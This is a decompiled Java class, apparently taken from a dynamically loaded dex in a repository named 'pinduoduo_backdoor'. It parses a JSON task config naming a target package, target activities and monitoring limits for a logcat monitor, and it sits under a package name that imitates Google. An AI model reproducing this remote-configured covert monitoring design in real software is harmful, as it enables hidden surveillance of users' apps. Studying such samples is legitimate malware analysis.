package com.google.android.sd.biz_dynamic_dex.td.logcat.c.a;

import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.td.logcat.a.b.b;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public final class a {
  public String a;
  
  public String b;
  
  public List<String> c;
  
  public long d;
  
  public int e;
  
  private int f;
  
  public static a a(String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return null; 
      JSONObject jSONObject = new JSONObject(paramString);
      a a1 = new a();
      a1.a = paramString;
      int i = 0;
      a1.f = jSONObject.optInt("execute_type", 0);
      a1.b = jSONObject.optString("target_pkg");
      JSONArray jSONArray = jSONObject.optJSONArray("target_as");
      if (jSONArray != null && jSONArray.length() > 0) {
        ArrayList<String> arrayList = new ArrayList();
        while (true) {
          if (i < jSONArray.length()) {
            String str = jSONArray.optString(i);
            if (!TextUtils.isEmpty(str))
              arrayList.add(str); 
          } else {
            a1.c = arrayList;
            a1.d = jSONObject.optLong("max_monitor_time_sec", 3600L);
            a1.e = jSONObject.optInt("max_cache_item_size", 100);
            return a1;
          } 
          i++;
        } 
      } 
      a1.d = jSONObject.optLong("max_monitor_time_sec", 3600L);
      a1.e = jSONObject.optInt("max_cache_item_size", 100);
      return a1;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("obtain_error_");
      stringBuilder.append(exception.getMessage());
      b.a(stringBuilder.toString());
      return null;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\8aeb045fad9343acbbd1a26998b6485a-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\c\a\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */